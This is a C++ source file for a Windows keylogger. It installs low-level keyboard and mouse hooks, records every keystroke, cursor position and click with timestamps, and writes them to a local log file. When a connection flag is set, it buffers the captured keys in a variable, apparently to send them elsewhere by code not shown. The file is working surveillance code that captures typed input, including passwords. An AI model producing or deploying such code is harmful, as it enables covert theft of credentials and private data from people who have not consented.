//
// Created by Nagamo_s on 15/11/2017.
//

#include "GetEvent.hpp"

GetEvent::GetEvent()
{
	Data &data = Data::Instance();
    localtime_s(&data.buf, &data.getTime());
	data.tools = Tools::Instance();
}

GetEvent::~GetEvent()
{
}

void GetEvent::Loop()
{
    MSG message;
    while (GetMessage(&message, nullptr,0,0))
    {
        TranslateMessage( &message );
        DispatchMessage( &message );
    }
}

void writeMessage(const std::string &message)
{
	Data &data = Data::Instance();
	if (data.tools.connect == false)
	{
		std::ofstream file;
		file.open("log", std::ios::app);
		file << message.c_str() << " ";
		file.close();
		std::cout << message.c_str() << " ";
	}
	else
	{
		data.tools.input += message;
		std::cout << message.c_str();
	}
}

bool checkTime()
{
	tm tmp;
	Data &data = Data::Instance();

	data.setTime(time(nullptr));
	localtime_s(&tmp, &data.getTime());
	if (tmp.tm_mday == data.buf.tm_mday && tmp.tm_mon == data.buf.tm_mon &&
		tmp.tm_year == data.buf.tm_year && tmp.tm_hour == data.buf.tm_hour &&
		tmp.tm_min == data.buf.tm_min && tmp.tm_sec == data.buf.tm_sec)
		return true;
	data.buf = tmp;

	if (data.tools.connect == false)
	{
		std::ofstream file;
		file.open("log", std::ios::app);

		file << std::endl;
		file << "-- " << tmp.tm_mday << " " << tmp.tm_mon << " " << tmp.tm_year + 1900 << " ";
		file << tmp.tm_hour << " " << tmp.tm_min << " " << tmp.tm_sec << " -- " << std::endl;

		file.close();
	}
	std::cout << std::endl;
    std::cout << "-- "<< tmp.tm_mday << " " << tmp.tm_mon << " " << tmp.tm_year + 1900 << " ";
    std::cout << tmp.tm_hour << " " << tmp.tm_min << " " << tmp.tm_sec << " -- " <<std::endl;
    return false;
}

LRESULT CALLBACK KeyboardEvent(int code, WPARAM wParam, LPARAM lParam)
{
	Data &data = Data::Instance();
    unsigned int key =  MapVirtualKey(((PKBDLLHOOKSTRUCT)lParam)->vkCode, MAPVK_VK_TO_CHAR);
    if  ((WM_SYSKEYDOWN == wParam)||(WM_KEYDOWN == wParam))
    {
        checkTime();
        std::string message(1, static_cast<const char>(key));
        writeMessage(message);

        if (((PKBDLLHOOKSTRUCT)lParam)->vkCode  == 27)
            PostQuitMessage(0);
    }
    return CallNextHookEx(data.getKeyBoardHook(), code, wParam, lParam);
}

LRESULT CALLBACK MouseEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	Data &data = Data::Instance();

    if (!checkTime())
    {
        if (data.getX() != ((PMSLLHOOKSTRUCT) lParam)->pt.x)
        {
            data.setX(((PMSLLHOOKSTRUCT) lParam)->pt.x);
            writeMessage("pos X = " + std::to_string(data.getX()));
        }
        if (data.getY() != ((PMSLLHOOKSTRUCT) lParam)->pt.y)
        {
            data.setY(((PMSLLHOOKSTRUCT) lParam)->pt.y);
            writeMessage("pos Y = " + std::to_string(data.getY()));
        }
    }
    if (WM_RBUTTONDOWN == wParam)
        writeMessage("Right Click Press !!!!");
    if (WM_LBUTTONDOWN == wParam)
        writeMessage("Left Click Press !!!!");
    if (WM_MOUSEWHEEL == wParam || WM_MOUSEHWHEEL == wParam)
        writeMessage("Wheel Scroll !!!!");
    return CallNextHookEx(data.getMouseHook(), nCode, wParam, lParam);
}

void GetEvent::InitLogger()
{
	Data &data = Data::Instance();

    data.setKeyBoardHook(SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyboardEvent, NULL,  NULL));
    data.setMouseHook(SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)MouseEvent, NULL,  NULL));
    Loop();
    UnhookWindowsHookEx(data.getKeyBoardHook());
    UnhookWindowsHookEx(data.getMouseHook());
}